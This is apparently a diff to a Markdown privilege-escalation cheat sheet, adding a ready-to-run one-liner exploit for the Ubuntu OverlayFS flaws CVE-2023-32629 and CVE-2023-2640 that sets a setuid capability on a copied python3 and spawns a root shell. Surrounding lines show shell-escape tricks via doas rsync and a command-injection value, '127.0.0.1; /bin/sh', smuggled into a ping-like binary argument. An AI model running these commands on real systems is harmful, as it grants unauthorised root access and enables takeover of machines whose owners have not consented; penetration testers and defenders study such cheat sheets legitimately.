@@ -126,6 +126,11 @@ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 /usr/bin/pingsys '127.0.0.1; /bin/sh'
 ```
 ---
+# Ubuntu Privilege escalation CVE-2023-32629 & CVE-2023-2640
+```
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
+rm -rf l u w m
+```
 # links
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [linEnum](https://github.com/rebootuser/LinEnum)
